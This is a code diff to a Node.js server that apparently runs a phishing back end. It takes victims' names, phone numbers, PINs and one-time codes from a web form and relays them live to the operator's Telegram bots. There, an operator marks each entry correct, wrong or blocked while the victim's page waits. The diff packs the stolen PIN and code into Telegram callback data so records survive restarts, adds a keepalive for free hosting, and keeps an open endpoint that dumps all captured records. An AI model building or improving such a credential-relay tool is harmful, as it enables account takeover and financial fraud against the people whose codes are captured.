@@ -13,13 +13,18 @@ const DOMAIN = (process.env.BACKEND_URL || '').replace(/\/+$/, '');
 
 const REQUIRED_UPDATES = ['message', 'callback_query'];
 const SEP = '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━';
-const REQ_TTL_MS = 30 * 60 * 1000; // 30 minutes
+const REQ_TTL_MS = 30 * 60 * 1000;
+const CB_MAX_BYTES = 64;
+
+// Keepalive: ping self every 14 minutes to prevent Render free-tier sleep
+const KEEPALIVE_INTERVAL_MS = 14 * 60 * 1000;
+// Webhook refresh: re-register webhooks every 10 minutes
+const WEBHOOK_REFRESH_INTERVAL_MS = 10 * 60 * 1000;
 
 
 // ============================================================
 // STARTUP
 // ============================================================
-
 console.log('');
 console.log('========================================');
 console.log('🚀 SERVER STARTING');
@@ -27,48 +32,34 @@ console.log('========================================');
 console.log('PORT:', PORT);
 console.log('DOMAIN:', DOMAIN || '(NOT SET)');
 console.log('========================================');
-
-if (!DOMAIN) {
-  console.warn('⚠️ BACKEND_URL is not set.');
-}
+if (!DOMAIN) console.warn('⚠️ BACKEND_URL is not set.');
 
 
 // ============================================================
 // BOTS
 // ============================================================
-
 const bots = [];
-
 for (const key of Object.keys(process.env)) {
   const match = key.match(/^BOT(\d+)_TOKEN$/);
   if (!match) continue;
-
   const number = match[1];
   const token = process.env[`BOT${number}_TOKEN`];
   const chatId = process.env[`BOT${number}_CHATID`];
-
-  if (token && chatId) {
-    bots.push({ botId: `bot${number}`, token, chatId });
-  }
+  if (token && chatId) bots.push({ botId: `bot${number}`, token, chatId });
 }
 
 console.log('');
 console.log('🤖 BOTS LOADED:');
-if (bots.length === 0) {
-  console.log('(none)');
-} else {
-  for (const bot of bots) console.log(`   ✅ ${bot.botId}`);
-}
+if (bots.length === 0) console.log('(none)');
+else for (const bot of bots) console.log(`   ✅ ${bot.botId}`);
 console.log('');
 
 
 // ============================================================
 // STORE
 // ============================================================
-
 const STORE_FILE = path.join(__dirname, 'data', 'store.json');
 fs.mkdirSync(path.dirname(STORE_FILE), { recursive: true });
-
 const store = { requests: {} };
 
 function loadStore() {
@@ -96,7 +87,6 @@ function saveStore() {
 
 loadStore();
 
-// Expire old requests every 5 minutes
 setInterval(() => {
   const now = Date.now();
   let changed = false;
@@ -113,7 +103,6 @@ setInterval(() => {
 // ============================================================
 // HELPERS
 // ============================================================
-
 function getBot(botId) {
   return bots.find(bot => bot.botId === botId);
 }
@@ -123,9 +112,11 @@ function newId() {
 }
 
 function clean(value) {
-  return String(value == null ? '' : value)
+  const s = String(value == null ? '' : value)
     .replace(/[\u200B-\u200D\uFEFF]/g, '')
+    .replace(/[|:]/g, '')
     .trim();
+  return /^unknown$/i.test(s) ? '' : s;
 }
 
 function escapeHtml(value) {
@@ -135,7 +126,6 @@ function escapeHtml(value) {
     .replace(/>/g, '&gt;');
 }
 
-// Builds a formatted message from real values (name/phone from store).
 function buildMessage(header, name, phone, extraLines = []) {
   const lines = [
     `<b>${escapeHtml(header)}</b>`,
@@ -153,14 +143,59 @@ function buildMessage(header, name, phone, extraLines = []) {
 
 
 // ============================================================
+// CALLBACK DATA PACKING (restart-safe)
+// ============================================================
+function packCallback(action, requestId, name, phone, extra) {
+  const n = clean(name);
+  const p = clean(phone);
+  const e = clean(extra);
+
+  const prefix = `${action}:${requestId}:`;
+  const budget = CB_MAX_BYTES - Buffer.byteLength(prefix, 'utf8');
+
+  if (e) {
+    const full = `${n}|${p}|${e}`;
+    if (Buffer.byteLength(full, 'utf8') <= budget) return prefix + full;
+  }
+  const np = `${n}|${p}`;
+  if (Buffer.byteLength(np, 'utf8') <= budget) return prefix + np;
+
+  const pOnly = `|${p}`;
+  if (Buffer.byteLength(pOnly, 'utf8') <= budget) return prefix + pOnly;
+
+  return prefix + '|';
+}
+
+function unpackCallback(data) {
+  if (!data) return null;
+  const i = data.indexOf(':');
+  if (i < 0) return null;
+  const action = data.slice(0, i);
+  const j = data.indexOf(':', i + 1);
+  if (j < 0) {
+    return { action, requestId: data.slice(i + 1), name: '', phone: '', extra: '' };
+  }
+  const requestId = data.slice(i + 1, j);
+  const parts = data.slice(j + 1).split('|');
+  return {
+    action,
+    requestId,
+    name:  parts[0] || '',
+    phone: parts[1] || '',
+    extra: parts[2] || ''
+  };
+}
+
+
+// ============================================================
 // TELEGRAM API
 // ============================================================
-
 async function telegram(bot, method, payload) {
   try {
     const response = await axios.post(
       `https://api.telegram.org/bot${bot.token}/${method}`,
-      payload
+      payload,
+      { timeout: 15000 }
     );
     return response.data;
   } catch (error) {
@@ -210,14 +245,8 @@ async function answerCallback(bot, callbackId, text) {
 // ============================================================
 // WEBHOOK SETUP
 // ============================================================
-
-async function setWebhook(bot) {
+async function setWebhook(bot, quiet = false) {
   const webhookUrl = `${DOMAIN}/telegram/${bot.botId}`;
-
-  console.log('');
-  console.log('🌐 SETTING WEBHOOK');
-  console.log('Bot:', bot.botId);
-  console.log('URL:', webhookUrl);
 
   const result = await telegram(bot, 'setWebhook', {
     url: webhookUrl,
@@ -226,11 +255,11 @@ async function setWebhook(bot) {
   });
 
   if (!result?.ok) {
-    console.error(`❌ WEBHOOK FAILED: ${bot.botId}`);
-    return;
+    console.error(`❌ WEBHOOK FAILED: ${bot.botId}`, result);
+    return false;
   }
-
-  console.log(`✅ WEBHOOK REGISTERED: ${bot.botId}`);
+  if (!quiet) console.log(`✅ WEBHOOK REGISTERED: ${bot.botId} → ${webhookUrl}`);
+  return true;
 }
 
 async function initializeWebhooks() {
@@ -238,42 +267,63 @@ async function initializeWebhooks() {
   console.log('========================================');
   console.log('🔧 INITIALIZING WEBHOOKS');
   console.log('========================================');
-
-  for (const bot of bots) {
-    await setWebhook(bot);
-  }
-
-  console.log('');
+  for (const bot of bots) await setWebhook(bot);
   console.log('✅ WEBHOOK INITIALIZATION FINISHED');
   console.log('');
+}
+
+async function refreshWebhooksQuiet() {
+  let ok = 0;
+  for (const bot of bots) {
+    if (await setWebhook(bot, true)) ok++;
+  }
+  console.log(`🔁 Webhook refresh: ${ok}/${bots.length} OK @ ${new Date().toISOString()}`);
+}
+
+
+// ============================================================
+// KEEPALIVE — prevents Render free-tier sleep
+// ============================================================
+function startKeepalive() {
+  if (!DOMAIN) {
+    console.warn('⚠️ KEEPALIVE DISABLED — DOMAIN not set');
+    return;
+  }
+  const url = `${DOMAIN}/health`;
+  console.log(`💓 KEEPALIVE: pinging ${url} every ${KEEPALIVE_INTERVAL_MS / 60000} min`);
+
+  setInterval(async () => {
+    try {
+      const r = await axios.get(url, { timeout: 10000 });
+      console.log(`💓 Keepalive OK (${r.status}) @ ${new Date().toISOString()}`);
+    } catch (err) {
+      console.error(`💓 Keepalive FAILED: ${err.message}`);
+    }
+  }, KEEPALIVE_INTERVAL_MS);
 }
 
 
 // ============================================================
 // MIDDLEWARE
 // ============================================================
-
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 app.use(express.static('public'));
 
 
 // ============================================================
-// HEALTH CHECK
+// HEALTH + DEBUG
 // ============================================================
-
 app.get('/health', (req, res) => {
   res.json({
     ok: true,
     domain: DOMAIN,
-    bots: bots.map(bot => bot.botId)
+    uptime: Math.floor(process.uptime()),
+    bots: bots.map(bot => bot.botId),
+    stored: Object.keys(store.requests).length,
+    time: new Date().toISOString()
   });
 });
-
-
-// ============================================================
-// DEBUG STORE
-// ============================================================
 
 app.get('/debug/store', (req, res) => {
   res.json(store);
@@ -283,7 +333,6 @@ app.get('/debug/store', (req, res) => {
 // ============================================================
 // BOT ROUTE
 // ============================================================
-
 app.get('/bot/:botId', (req, res) => {
   const bot = getBot(req.params.botId);
   if (!bot) return res.status(404).send('Unknown bot');
@@ -292,9 +341,8 @@ app.get('/bot/:botId', (req, res) => {
 
 
 // ============================================================
-// SUBMIT ROUTES (phone / pin / code)
+// SUBMIT ROUTES
 // ============================================================
-
 function handleSubmit(type) {
   return (req, res) => {
     const body = req.body || {};
@@ -324,26 +372,26 @@ function handleSubmit(type) {
     if (type === 'phone') {
       header = '📱 PHONE NUMBER VERIFICATION';
       keyboard = [[
-        { text: '✅ Approve', callback_data: `phone_ok:${requestId}` },
-        { text: '❌ Reject',  callback_data: `phone_bad:${requestId}` }
+        { text: '✅ Approve', callback_data: packCallback('phone_ok',  requestId, rec.name, rec.phone) },
+        { text: '❌ Reject',  callback_data: packCallback('phone_bad', requestId, rec.name, rec.phone) }
       ]];
     } else if (type === 'pin') {
       rec.pin = clean(body.pin);
       extra = [`<b>PIN:</b>  <b><code>${escapeHtml(rec.pin)}</code></b>`];
       header = '🔐 PIN VERIFICATION';
       keyboard = [
-        [{ text: '✅ Correct', callback_data: `pin_ok:${requestId}` },
-         { text: '❌ Wrong',   callback_data: `pin_bad:${requestId}` }],
-        [{ text: '🛑 Block',   callback_data: `pin_block:${requestId}` }]
+        [{ text: '✅ Correct', callback_data: packCallback('pin_ok',    requestId, rec.name, rec.phone, rec.pin) },
+         { text: '❌ Wrong',   callback_data: packCallback('pin_bad',   requestId, rec.name, rec.phone, rec.pin) }],
+        [{ text: '🛑 Block',   callback_data: packCallback('pin_block', requestId, rec.name, rec.phone, rec.pin) }]
       ];
     } else if (type === 'code') {
       rec.code = clean(body.code);
       extra = [`<b>Code:</b> <b><code>${escapeHtml(rec.code)}</code></b>`];
       header = '🔑 OTP CODE VERIFICATION';
       keyboard = [
-        [{ text: '✅ Correct', callback_data: `code_ok:${requestId}` },
-         { text: '❌ Wrong',   callback_data: `code_bad:${requestId}` }],
-        [{ text: '📋 Copy Code', callback_data: `code_copy:${requestId}` }]
+        [{ text: '✅ Correct', callback_data: packCallback('code_ok',   requestId, rec.name, rec.phone, rec.code) },
+         { text: '❌ Wrong',   callback_data: packCallback('code_bad',  requestId, rec.name, rec.phone, rec.code) }],
+        [{ text: '📋 Copy Code', callback_data: packCallback('code_copy', requestId, rec.name, rec.phone, rec.code) }]
       ];
     }
 
@@ -364,9 +412,8 @@ app.post('/submit-code',  handleSubmit('code'));
 
 
 // ============================================================
-// CHECK ROUTES (frontend polling)
+// CHECK ROUTES
 // ============================================================
-
 function handleCheck(req, res) {
   const r = store.requests[req.params.requestId];
   if (!r) return res.json({ approved: null });
@@ -387,13 +434,9 @@ app.get('/check-code/:requestId',  handleCheck);
 
 
 // ============================================================
-// TELEGRAM GET TEST
+// TELEGRAM GET TEST + WEBHOOK INFO
 // ============================================================
-
 app.get('/telegram/:botId', (req, res) => {
-  console.log('');
-  console.log('🧪 TELEGRAM GET TEST');
-  console.log('Bot:', req.params.botId);
   res.json({
     ok: true,
     route: `/telegram/${req.params.botId}`,
@@ -401,38 +444,22 @@ app.get('/telegram/:botId', (req, res) => {
   });
 });
 
-
-// ============================================================
-// WEBHOOK INFO TEST
-// ============================================================
-
 app.get('/webhook-info/:botId', async (req, res) => {
   const bot = getBot(req.params.botId);
-  if (!bot) {
-    return res.status(404).json({ ok: false, error: 'Unknown bot' });
-  }
-
+  if (!bot) return res.status(404).json({ ok: false, error: 'Unknown bot' });
   const result = await telegram(bot, 'getWebhookInfo', {});
   res.json(result || { ok: false, error: 'Telegram request failed' });
 });
 
-
-// ============================================================
-// TELEGRAM TEST MESSAGE
-// ============================================================
-
 app.get('/telegram-test/:botId', async (req, res) => {
   const bot = getBot(req.params.botId);
-  if (!bot) {
-    return res.status(404).json({ ok: false, error: 'Unknown bot' });
-  }
+  if (!bot) return res.status(404).json({ ok: false, error: 'Unknown bot' });
 
   const result = await sendMessage(
     bot,
     '🧪 <b>Webhook callback test</b>\n\nClick the button below.',
     [[{ text: 'TEST CALLBACK', callback_data: 'test_callback' }]]
   );
-
   res.json({ ok: result?.ok === true, botId: bot.botId, telegram: result });
 });
 
@@ -440,7 +467,6 @@ app.get('/telegram-test/:botId', async (req, res) => {
 // ============================================================
 // TELEGRAM POST WEBHOOK
 // ============================================================
-
 app.post('/telegram/:botId', async (req, res) => {
   console.log('');
   console.log('========================================');
@@ -468,7 +494,6 @@ app.post('/telegram/:botId', async (req, res) => {
 
     // ---- Test callback ----
     if (data === 'test_callback') {
-      console.log('✅ TEST CALLBACK SUCCESS');
       await answerCallback(bot, callback.id, 'Webhook is working ✅');
       if (callback.message?.chat?.id && callback.message?.message_id) {
         await editMessage(
@@ -481,25 +506,41 @@ app.post('/telegram/:botId', async (req, res) => {
       return;
     }
 
-    // ---- Real callbacks: format is  action:requestId  ----
-    const i = data.indexOf(':');
-    if (i < 0) {
-      console.log('⚠️ Bad callback format:', data);
+    // ---- Parse ----
+    const parsed = unpackCallback(data);
+    if (!parsed) {
+      console.log('⚠️ Malformed callback data:', data);
       await answerCallback(bot, callback.id, 'Invalid action');
       return;
     }
 
-    const action = data.slice(0, i);
-    const requestId = data.slice(i + 1);
-
+    const { action, requestId } = parsed;
     console.log('🎯 Action:', action, '| requestId:', requestId);
 
-    const rec = store.requests[requestId];
+    // ---- Resolve data: store first, callback fallback ----
+    let rec = store.requests[requestId];
+    let fromCallback = false;
+
     if (!rec) {
-      console.log(`⚠️ No store entry for requestId ${requestId}`);
-      await answerCallback(bot, callback.id, 'This request has expired.');
-      return;
+      console.log('⚠️ Store miss — rebuilding from callback payload');
+      rec = {
+        botId: bot.botId,
+        type: action.startsWith('phone') ? 'phone'
+            : action.startsWith('pin')   ? 'pin'
+            : 'code',
+        name: parsed.name,
+        phone: parsed.phone,
+        pin:  action.startsWith('pin')  ? parsed.extra : undefined,
+        code: action.startsWith('code') ? parsed.extra : undefined,
+        status: 'pending',
+        createdAt: Date.now(),
+        _rebuiltFromCallback: true
+      };
+      store.requests[requestId] = rec;
+      fromCallback = true;
     }
+
+    console.log('📋 Using:', JSON.stringify({ name: rec.name, phone: rec.phone, fromCallback }));
 
     // ---- Copy code ----
     if (action === 'code_copy') {
@@ -513,7 +554,7 @@ app.post('/telegram/:botId', async (req, res) => {
       return;
     }
 
-    // ---- Map action to new status ----
+    // ---- Map action → status ----
     let newStatus;
     let feedback;
     switch (action) {
@@ -534,19 +575,19 @@ app.post('/telegram/:botId', async (req, res) => {
     rec.updatedAt = Date.now();
     saveStore();
 
-    console.log(`✅ ${action} → ${requestId} (${rec.name} / ${rec.phone}) status=${newStatus}`);
+    console.log(`✅ ${action} → ${requestId} (${rec.name} / ${rec.phone}) status=${newStatus}${fromCallback ? ' [from callback]' : ''}`);
 
     await answerCallback(bot, callback.id, feedback);
 
-    // ---- Rebuild message from the SAME record we stored ----
+    // ---- Rebuild message from the SAME record ----
     const headers = {
       phone: '📱 PHONE NUMBER VERIFICATION',
       pin:   '🔐 PIN VERIFICATION',
       code:  '🔑 OTP CODE VERIFICATION'
     };
     const extra = [];
-    if (rec.type === 'pin')  extra.push(`<b>PIN:</b>  <b><code>${escapeHtml(rec.pin || '')}</code></b>`);
-    if (rec.type === 'code') extra.push(`<b>Code:</b> <b><code>${escapeHtml(rec.code || '')}</code></b>`);
+    if (rec.type === 'pin'  && rec.pin)  extra.push(`<b>PIN:</b>  <b><code>${escapeHtml(rec.pin)}</code></b>`);
+    if (rec.type === 'code' && rec.code) extra.push(`<b>Code:</b> <b><code>${escapeHtml(rec.code)}</code></b>`);
     extra.push(`<b>Status:</b> ${feedback}`);
 
     const newText = buildMessage(headers[rec.type] || 'VERIFICATION', rec.name, rec.phone, extra);
@@ -554,10 +595,7 @@ app.post('/telegram/:botId', async (req, res) => {
     if (callback.message?.message_id) {
       await editMessage(bot, callback.message.chat.id, callback.message.message_id, newText);
     }
-    await sendMessage(
-      bot,
-      buildMessage(`📝 RESPONSE — ${feedback}`, rec.name, rec.phone)
-    );
+    await sendMessage(bot, buildMessage(`📝 RESPONSE — ${feedback}`, rec.name, rec.phone));
 
   } catch (error) {
     console.error('');
@@ -568,9 +606,8 @@ app.post('/telegram/:botId', async (req, res) => {
 
 
 // ============================================================
-// START SERVER
+// START
 // ============================================================
-
 app.listen(PORT, async () => {
   console.log('');
   console.log('========================================');
@@ -584,4 +621,10 @@ app.listen(PORT, async () => {
   }
 
   await initializeWebhooks();
+
+  // Start keepalive so Render free tier doesn't put us to sleep
+  startKeepalive();
+
+  // Refresh webhooks every 10 minutes in case Telegram drops them
+  setInterval(refreshWebhooksQuiet, WEBHOOK_REFRESH_INTERVAL_MS);
 });
